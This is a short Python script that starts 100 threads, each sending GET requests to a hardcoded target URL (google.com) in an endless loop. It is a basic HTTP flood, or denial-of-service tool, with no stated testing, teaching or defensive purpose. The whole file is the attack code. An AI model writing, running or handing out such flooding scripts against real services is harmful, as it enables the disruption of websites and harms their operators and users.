import requests
import threading

# Define the target URL
target_url = "https://google.com"

# Define the function to send a GET request to the target URL
def send_request():
    while True:
        try:
            requests.get(target_url)
            print("Request sent to:", target_url)
        except Exception as e:
            print("Error sending request:", e)

# Define the number of threads to use for sending requests
num_threads = 100

# Start multiple threads to send requests simultaneously
for _ in range(num_threads):
    thread = threading.Thread(target=send_request)
    thread.start()
